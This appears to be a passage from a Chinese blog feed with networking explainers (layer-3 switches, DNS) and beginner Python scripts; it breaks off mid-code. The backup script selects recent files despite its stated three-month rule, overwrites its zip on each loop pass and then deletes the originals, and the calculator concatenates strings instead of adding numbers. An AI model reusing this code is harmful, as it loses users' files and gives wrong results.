        <content type="html"><![CDATA[<h2 id="01-三层交换机产生的原因？"><a href="#01-三层交换机产生的原因？" class="headerlink" title="01 三层交换机产生的原因？"></a>01 三层交换机产生的原因？</h2><p>要说三层交换机啊，我们还得从路由器说起。</p><p><strong>路由器本身有什么特点呢?</strong></p><p>1、支持路由协议，使得不同网段的主机能够进行通信。</p><p>2、支持多种接口类型，不仅有以太网接口，还有串行接口等，广泛地应用于接入广域网（出口路由器）。</p><p>3、支持安全过滤功能，如ACL、MAC地址过滤等等。</p><p>4、虚拟隧道功能，使得外地出差的人也能够访问公司内网等。</p><p><strong>也就是说，路由器除了最基础的路由转发功能外，还是一个优秀的综合性人才。</strong></p><p>但是呢，这里有一个问题，路由器本身接口不多，通常情况下3~4个接口。转发流量相对受限，并且机器价格昂贵。</p><p>那么如果你是一家企业的网络构架师，发现企业网络中有数百个网段，是不是就意味着你需要更多的路由器接口？</p><p>理论上来说，增加更多的路由接口是可行的。但是实际情况下，通常不这么做，因为<strong>路由器转发流量所限，以及机器价格昂贵，所以使用路由器来转发局域网内的流量性价比很低</strong>。</p><p>那么有没有说明更好的解决方法嘛？</p><p><strong>答案是有的，我们发现局域网中基本都是以太网接口，如果传统的二层交换机能具备基础的路由功能，升级成三层交换机，不仅可以完成二层的交换，又可以实现三层的路由，那就可以在内网中很大程度上替代路由器。</strong><br><br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200516065321575.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h2 id="02-二层交换机如何变成三层交换机？"><a href="#02-二层交换机如何变成三层交换机？" class="headerlink" title="02 二层交换机如何变成三层交换机？"></a>02 二层交换机如何变成三层交换机？</h2><p>二层交换机变成三层交换机，有以下改动：</p><p>①交换机安装TCP/IP协议栈，配置上IP参数。</p><p>②交换机识别以太帧头，将发给自己MAC以及广播MAC的流量过滤上来路由处理。</p><p>②交换机增添路由协议来产生路由表</p><p>③交换机将路由表转化为硬件转发表，实现硬件转发，提高转发性能<br><br></p><h2 id="03-三层交换机如何配置IP地址？"><a href="#03-三层交换机如何配置IP地址？" class="headerlink" title="03 三层交换机如何配置IP地址？"></a>03 三层交换机如何配置IP地址？</h2><p>1、在物理接口配置<br>int  G 0/1<br>no switch-port<br>ip address 10.1.1.1 255.255.255.0</p><p>2、在子接口配置<br>int  G 0/1.10<br>encapsulation 802.1q 10<br>ip address 10.1.1.1 255.255.255.0</p><p>3、进入VLAN配置<br>int vlan 10<br>ip address 10.1.1.1 255.255.255.0</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 交换机 </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个故事弄懂域名解析</title>
      <link href="/2020/07/19/yi-ge-gu-shi-nong-dong-yu-ming-jie-xi/"/>
      <url>/2020/07/19/yi-ge-gu-shi-nong-dong-yu-ming-jie-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="01-为什么需要域名解析？"><a href="#01-为什么需要域名解析？" class="headerlink" title="01 为什么需要域名解析？"></a>01 为什么需要域名解析？</h2><p>先来简单说一下为什么要需要域名解析。<br>先给读者做一个选择题，如果选择以下一个字符串作为你的密码，为<strong>方便记忆</strong>你会选择哪一个？<br>①admin123   ②~qX4-kx</p><p>我想如果是出于方便记忆的角度看，怎么看①选项怎么都比②占优势，对吧。毕竟，某种程度上，①有一定的意义，而②毫无意义。</p><p>实际上，域名解析和IP地址也是一样的。虽然IP地址是网络上的唯一确定地址，可是它难记啊。所以我们就想了个办法，<strong>为了方便记忆，将一段有有意义的、我们便于理解的消息，映射到纯粹数字的IP地址</strong>。即域名对应IP地址。</p><br><h2 id="02-有关于域名解析的小故事"><a href="#02-有关于域名解析的小故事" class="headerlink" title="02 有关于域名解析的小故事"></a>02 有关于域名解析的小故事</h2><p>场景假设：张三在浏览器中输入自己想要访问的域名：<a href="https://baidu.com后，具体的域名解析流程是怎么样的的呢？" rel="external nofollow noreferrer">https://baidu.com后，具体的域名解析流程是怎么样的的呢？</a></p><p>话不多说，我们直接上故事，一个有关于<strong>浏览器、DNS进程、本地Host文件、DNS 服务器</strong>之间不得不说的故事。</p><p>故事的发展是这样的：</p><p>1、张三在浏览器中输入域名，浏览器接过域名后，拍拍胸脯爽快地说：没关系，我朋友多，准能帮你找到域名对应的IP地址<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200514101556779.png#pic_center" alt=""><br><br><br>2、浏览器先找到了他的朋友DNS进程，说请帮我解析域名为：<a href="https://baidu.com" target="_blank" rel="noopener external nofollow noreferrer">https://baidu.com</a> 的IP地址吧，DNS进程接过域名说：好嘞，等我会儿，我马上去找找<br><br></p><p>3、DNS进程先在仔细在脑海里回忆（查看程序缓存Cache）,想着如果有 <a href="https://baidu.com" target="_blank" rel="noopener external nofollow noreferrer">https://baidu.com</a> 所对应的IP地址，则直接告诉浏览器。如果脑子里（缓存里）没有找到，那么就去找找他的Host本地文件大兄弟，进入下一步<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200514101610582.png#pic_center" alt=""><br><br><br>4、本地Host文件翻翻自己做的笔记（Host文件里的内容），看看有没有，有则直接告诉浏览器。可是Host文件也没有找到，则进入下一步<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200514101954361.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>5、Host文件没辙了，那该怎么办呢？它想到了请外援，请见多识广的DNS 服务器大哥来帮忙。于是检查本地的DNS服务器配置，得到DNS 服务器的IP地址：8.8.8.8，发消息给它，让它帮帮忙<br><br><br>6、DNS Server（8.8.8.8)接到求助后发现自己的缓存里也没有该域名对应的IP地址，于是向自己的上级DNS 服务器（7.7.7.7）发送协助请求。  DNS 服务器（7.7.7.7）在自己的缓存里发现了这个域名对应的IP地址，<a href="https://baidu.com" target="_blank" rel="noopener external nofollow noreferrer">https://baidu.com</a> 对应2.2.2.2  。于是将这个结果发给了DNS服务器（8.8.8.8），然后返回给张三计算机的DNS进程.<br><br><br>7、DNS进程终于拿到了域名对应的IP地址，赶忙跑到浏览器面前说:哥，你要的东西我终于拿到了，<a href="https://baidu.com" target="_blank" rel="noopener external nofollow noreferrer">https://baidu.com</a> 对应2.2.2.2<br><br><br>8、就这样，浏览器拿到了IP地址，终于向对方的Web服务器发起了请求。<br><br></p><h2 id="03-简单总结"><a href="#03-简单总结" class="headerlink" title="03 简单总结"></a>03 简单总结</h2><p>① 域名的存在是为了方便使用者的记忆</p><p>② 域名解析，最复杂的情况下，需要DNS进程、本地Host文件、DNS 服务器的全力配合</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科普 </tag>
            
            <tag> 域名解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python——获取网页文本内容</title>
      <link href="/2020/07/19/python-huo-qu-wang-ye-wen-ben-nei-rong/"/>
      <url>/2020/07/19/python-huo-qu-wang-ye-wen-ben-nei-rong/</url>
      
        <content type="html"><![CDATA[<h2 id="01-实现背景"><a href="#01-实现背景" class="headerlink" title="01 实现背景"></a>01 实现背景</h2><p>1、免费小说网站：<a href="http://book.zongheng.com/，我们获取的文字信息就来源于该网站" target="_blank" rel="noopener external nofollow noreferrer">http://book.zongheng.com/，我们获取的文字信息就来源于该网站</a></p><p>2、requests模块，用于http形式请求访问网页</p><p>3、BeautifulSoup模块，用于解析获取到的网页内容</p><p><br><br></p><h2 id="02-实现目标"><a href="#02-实现目标" class="headerlink" title="02 实现目标"></a>02 实现目标<br></h2><p>首先利用requests模块获取网页源码，通过BeautifulSoup模块进一步筛选获得文本内容<br><br><br></p><h2 id="03-注意事项"><a href="#03-注意事项" class="headerlink" title="03 注意事项"></a>03 注意事项</h2><p>如需将获取内容输入到本地文件，可自行利用with…open操作</p><p><br><br></p><h2 id="04-实现代码"><a href="#04-实现代码" class="headerlink" title="04 实现代码"></a>04 实现代码</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests <span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoupurl <span class="token operator">=</span> <span class="token string">'http://book.zongheng.com/chapter/897468/58575172.html'</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">)</span>html <span class="token operator">=</span> resp<span class="token punctuation">.</span>textsoup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">"html.parser"</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span>  range<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p><br><br></p><h2 id="05-实现效果"><a href="#05-实现效果" class="headerlink" title="05 实现效果"></a>05 实现效果</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200517165739894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python——实现自动化打包文件并备份</title>
      <link href="/2020/07/19/python-shi-xian-zi-dong-hua-da-bao-wen-jian-bing-bei-fen/"/>
      <url>/2020/07/19/python-shi-xian-zi-dong-hua-da-bao-wen-jian-bing-bei-fen/</url>
      
        <content type="html"><![CDATA[<h2 id="01-实现背景"><a href="#01-实现背景" class="headerlink" title="01 实现背景"></a>01 实现背景<br><br></h2><p>1、os模块，实现文件的重命名、创建新文件夹操作</p><p>2、datetime模块，用于获取当前年、月、日</p><p>3、shutil模块，用于移动文件</p><p>4、zipfile模块，用于创建压缩包</p><p><br><br></p><h2 id="02-实现目标"><a href="#02-实现目标" class="headerlink" title="02 实现目标"></a>02 实现目标</h2><p>1、找出当前目录下超过3个月未操作过的文件，并将其重命名，在原本文件名的开头加上最后修改日期，如 <strong>“text.py”</strong> 改为 <strong>“2020-5-17-text.py”</strong>。</p><p>2、创建一个新文件夹叫backup,将所有重命名的文件都添加到压缩包里，给压缩包加上今天日期</p><p>3、将压缩包移动到backup文件夹里，并删除原始文件<br><br><br></p><h2 id="03-注意事项"><a href="#03-注意事项" class="headerlink" title="03 注意事项"></a>03 注意事项</h2><p>1、若想实现任意目录下的压缩操作，可以在os.walk()函数中自行加入路径</p><p>2、代码中自定义过期文件时间为3个月，若想更改过期文件的时间，可以自行修改数字‘90’<br><br></p><h2 id="04-实现代码"><a href="#04-实现代码" class="headerlink" title="04 实现代码"></a>04 实现代码</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> datetime<span class="token keyword">import</span> shutil<span class="token keyword">import</span>  zipfileyear <span class="token operator">=</span> str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span>month <span class="token operator">=</span> str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>month<span class="token punctuation">)</span>day <span class="token operator">=</span> str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>day<span class="token punctuation">)</span>time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>year <span class="token operator">=</span> str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span>month <span class="token operator">=</span> str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>month<span class="token punctuation">)</span>day <span class="token operator">=</span> str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>day<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'backup'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'backup'</span><span class="token punctuation">)</span><span class="token keyword">for</span> dirpath<span class="token punctuation">,</span>dirnames<span class="token punctuation">,</span>file <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>fromtimestamp<span class="token punctuation">(</span>os<span class="token punctuation">.</span>stat<span class="token punctuation">(</span>dirpath<span class="token punctuation">)</span><span class="token punctuation">.</span>st_mtime<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>time1 <span class="token operator">-</span>time2<span class="token punctuation">)</span><span class="token punctuation">.</span>days <span class="token operator">&lt;</span> <span class="token number">90</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> files <span class="token keyword">in</span> file<span class="token punctuation">:</span>            Olddir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>dirpath<span class="token punctuation">,</span>files<span class="token punctuation">)</span>            Newdir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>dirpath<span class="token punctuation">,</span>year<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>month<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span><span class="token string">'  '</span><span class="token operator">+</span>day<span class="token operator">+</span>files<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>Olddir<span class="token punctuation">,</span>Newdir<span class="token punctuation">)</span>            <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>year<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>month<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span><span class="token string">'  '</span><span class="token operator">+</span>day<span class="token operator">+</span><span class="token string">'.zip'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>                zipobj<span class="token punctuation">.</span>write<span class="token punctuation">(</span>Newdir<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>Newdir<span class="token punctuation">)</span>shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span>year<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>month<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span><span class="token string">'  '</span><span class="token operator">+</span>day<span class="token operator">+</span><span class="token string">'.zip'</span><span class="token punctuation">,</span><span class="token string">'backup/'</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 批处理 </tag>
            
            <tag> 办公 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python——实现简易计算器</title>
      <link href="/2020/07/19/python-shi-xian-jian-yi-ji-suan-qi/"/>
      <url>/2020/07/19/python-shi-xian-jian-yi-ji-suan-qi/</url>
      
        <content type="html"><![CDATA[<h2 id="01-实现背景"><a href="#01-实现背景" class="headerlink" title="01 实现背景"></a>01 实现背景</h2><p>1、print函数中，多行文字 ‘’’  ‘’’ 的使用</p><p>2、input输入内容为字符串，input()内文字可做提示词</p><p>3、为方便使用，我们经常将常用的程序段封装成函数使用<br><br><br></p><h2 id="02-实现目标"><a href="#02-实现目标" class="headerlink" title="02 实现目标"></a>02 实现目标</h2><p>实现一个简易的计算器，可以实现简单的加减乘除运算<br><br><br></p><h2 id="03-注意事项"><a href="#03-注意事项" class="headerlink" title="03 注意事项"></a>03 注意事项</h2><p>Python中，不同的缩进关系代表了不同层次的代码段，需要多加注意</p><p><br><br></p><h2 id="04-实现代码"><a href="#04-实现代码" class="headerlink" title="04 实现代码"></a>04 实现代码</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> x<span class="token operator">+</span>y<span class="token keyword">def</span> <span class="token function">substract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> x<span class="token operator">-</span>y<span class="token keyword">def</span> <span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> x<span class="token operator">*</span>y<span class="token keyword">def</span> <span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> x<span class="token operator">/</span>y<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''"*********欢迎来到简便计算器*********    请选择运算方式    1、相  加    2、相  减    3、相  乘    4、相  除'''</span><span class="token punctuation">)</span>choice <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入你的选择(1/2/3/4):"</span><span class="token punctuation">)</span>num1 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入第一个数字:"</span><span class="token punctuation">)</span>num2 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入第二个数字:"</span><span class="token punctuation">)</span><span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t   '</span><span class="token punctuation">,</span>num1<span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span>num2<span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span>add<span class="token punctuation">(</span>num1<span class="token punctuation">,</span>num2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t   '</span><span class="token punctuation">,</span>num1<span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span>num2<span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span>substract<span class="token punctuation">(</span>num1<span class="token punctuation">,</span>num2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t   '</span><span class="token punctuation">,</span>num1<span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span>num2<span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span>multiply<span class="token punctuation">(</span>num1<span class="token punctuation">,</span>num2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'4'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t   '</span><span class="token punctuation">,</span>num1<span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span>num2<span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span>divide<span class="token punctuation">(</span>num1<span class="token punctuation">,</span>num2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入错误，请重新输入"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span></code></pre><p><br><br></p><h2 id="05-实现效果"><a href="#05-实现效果" class="headerlink" title="05 实现效果"></a>05 实现效果</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200517164723119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200517164735289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 计算器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python——实现根据日期查找文件</title>
      <link href="/2020/07/19/python-shi-xian-gen-ju-ri-qi-cha-zhao-wen-jian/"/>
      <url>/2020/07/19/python-shi-xian-gen-ju-ri-qi-cha-zhao-wen-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="01-实现背景"><a href="#01-实现背景" class="headerlink" title="01 实现背景"></a>01 实现背景</h2><p>1、os模块，实现文件的重命名、创建新文件夹操作</p><p>2、datetime模块，用于文件时间对比操作</p><p>3、fnmatch模块，用于模糊匹配文件名<br><br></p><h2 id="02-实现目标"><a href="#02-实现目标" class="headerlink" title="02 实现目标"></a>02 实现目标</h2><p>1、遍历搜索整个文件夹，包括文件夹内的所有文件夹</p><p>2、筛选这些文件中日期晚于2020年之后的文件</p><p>3、输出这些文件的文件名<br><br></p><h2 id="03-注意事项"><a href="#03-注意事项" class="headerlink" title="03 注意事项"></a>03 注意事项</h2><p>1、若想实现任意目录下的查找操作，可以在os.walk()函数中自行加入路径</p><p>2、若想实现对任意文件类型的查找操作，可以在fnmatch函数中自行匹配对应文件类型<br><br></p><h2 id="04-实现代码"><a href="#04-实现代码" class="headerlink" title="04 实现代码"></a>04 实现代码</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> fnmatch<span class="token keyword">import</span> datetime<span class="token keyword">for</span> dirpath<span class="token punctuation">,</span>dirnames<span class="token punctuation">,</span>file <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>stat<span class="token punctuation">(</span>dirpath<span class="token punctuation">)</span><span class="token punctuation">.</span>st_size <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            files <span class="token operator">=</span> file<span class="token keyword">for</span> file <span class="token keyword">in</span> files<span class="token punctuation">:</span>    <span class="token keyword">if</span> fnmatch<span class="token punctuation">.</span>fnmatch<span class="token punctuation">(</span>str<span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'*.py'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token number">2020</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        time2 <span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>fromtimestamp<span class="token punctuation">(</span>os<span class="token punctuation">.</span>stat<span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">.</span>st_ctime<span class="token punctuation">)</span>        dayCount <span class="token operator">=</span> <span class="token punctuation">(</span>time1 <span class="token operator">-</span>time2<span class="token punctuation">)</span><span class="token punctuation">.</span>days        <span class="token keyword">if</span> dayCount <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span></code></pre><h2 id="05-实现效果"><a href="#05-实现效果" class="headerlink" title="05 实现效果"></a>05 实现效果</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200517161419283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python——实现文件批量重命名及备份</title>
      <link href="/2020/07/19/python-shi-xian-wen-jian-pi-liang-chong-ming-ming-ji-bei-fen/"/>
      <url>/2020/07/19/python-shi-xian-wen-jian-pi-liang-chong-ming-ming-ji-bei-fen/</url>
      
        <content type="html"><![CDATA[<h2 id="01-实现背景"><a href="#01-实现背景" class="headerlink" title="01 实现背景"></a>01 实现背景</h2><p>1、os模块，实现文件的重命名、创建新文件夹操作</p><p>2、datetime模块，用于获取当前年、月、日</p><p>3、shutil模块，用于移动文件<br><br></p><h2 id="02-实现目标"><a href="#02-实现目标" class="headerlink" title="02 实现目标"></a>02 实现目标</h2><p>1、找出当前目录下所有.py文件，将所有该类型文件重名，在原本文件名的开头加上最后修改日期，如 <strong>“text.py”</strong> 改为  <strong>“2020-5-17-text.py”</strong>。</p><p>2、创建一个新的备份文件夹，叫backup，并将所有重命名后的文件都移动到back文件夹里面。<br><br></p><h2 id="03-注意事项"><a href="#03-注意事项" class="headerlink" title="03 注意事项"></a>03 注意事项</h2><p>1、若想实现任意目录下的批量操作，可以在os.sacndir()函数中自行加入路径</p><p>2、若想实现对任意文件类型的批量操作，可以在endwith()函数中自行加入文件后缀名</p><br><h2 id="04-实现代码"><a href="#04-实现代码" class="headerlink" title="04 实现代码"></a>04 实现代码</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> datetime<span class="token keyword">import</span> shutilyear <span class="token operator">=</span> str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span>month <span class="token operator">=</span> str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>month<span class="token punctuation">)</span>day <span class="token operator">=</span> str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>day<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'backup'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'backup'</span><span class="token punctuation">)</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> file <span class="token keyword">in</span> files<span class="token punctuation">:</span>    <span class="token keyword">if</span> str<span class="token punctuation">(</span>file<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.py'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>file<span class="token punctuation">.</span>name<span class="token punctuation">,</span>year<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>month<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>day<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>file<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        shutil<span 